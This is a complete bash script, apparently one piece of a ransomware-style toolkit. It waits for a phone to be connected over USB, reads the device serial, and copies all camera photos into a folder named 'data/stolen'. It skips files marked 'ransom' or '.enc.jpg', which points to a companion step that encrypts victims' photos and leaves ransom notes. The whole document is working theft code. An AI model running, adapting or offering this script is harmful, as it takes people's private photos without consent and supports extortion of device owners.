#!/bin/bash
#This script will wait for a phone to be plugged in and copy its camera photos locally

oldusblist=$(lsusb)
"./wait-for-phone.sh"
LOCALPATH=$(pwd)
PHONEPATH=$(echo /run/user/$UID/gvfs/mtp*/*/DCIM/Camera)
echo $PHONEPATH



#make folder to store stolen files. named as device serial number and timestamp
cd data/stolen
deviceinfo=$(lsusb | grep -v "$oldusblist")
devicebus=$(echo $deviceinfo | awk -F' |: ' '/Device /{gsub(" "," ");print $2}')
devicenumber=$(echo $deviceinfo | awk -F' |: ' '/Device /{gsub(" "," ");print $4}')

DEVICEID=$(udevadm info --name=/dev/bus/usb/$devicebus/$devicenumber | awk -F'=' '/ID_SERIAL=/{gsub("_"," ");print $2}')

timestamp=$(date)
TRANSDIR="$DEVICEID $timestamp"
mkdir "$TRANSDIR"



cd "$PHONEPATH"

currentfile=1
filecount=$(ls -1 | grep -v "ransom" | grep -v ".enc.jpg" | wc -l)

for f in *
do 
		echo "transferring $f ($currentfile/$filecount)..."
		gvfs-copy "$f" "$LOCALPATH/data/stolen/$TRANSDIR"
		currentfile=$((currentfile+1))
done
cd "$LOCALPATH"


echo ""

echo Transfer complete. Photos stored in "data/stolen/$TRANSDIR"
echo ""
